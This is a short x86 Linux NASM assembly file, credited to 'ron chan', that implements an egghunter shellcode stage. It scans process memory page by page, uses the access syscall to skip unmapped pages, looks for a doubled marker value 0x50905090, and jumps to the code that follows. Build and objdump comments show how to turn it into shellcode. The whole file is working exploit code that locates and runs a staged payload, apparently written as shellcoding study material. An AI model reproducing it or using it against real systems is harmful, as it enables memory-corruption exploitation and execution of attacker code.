; author ron chan
; compile
; nasm -f egghunter.nasm
; ld egghunter.o -o egghunter
; objdump -d egghunter



global _start			

section .text
_start:	
	xor edx,edx
	xor ecx,ecx
page:
	or dx,0xfff
comparison:
	inc edx
	lea ebx,[edx+0x4]
	push byte +0x21
	pop eax
	int 0x80
	cmp al,0xf2
	jz page
	mov eax,0x50905090
	mov edi,edx
	scasd
	jnz comparison
	scasd
	jnz comparison
	jmp edi
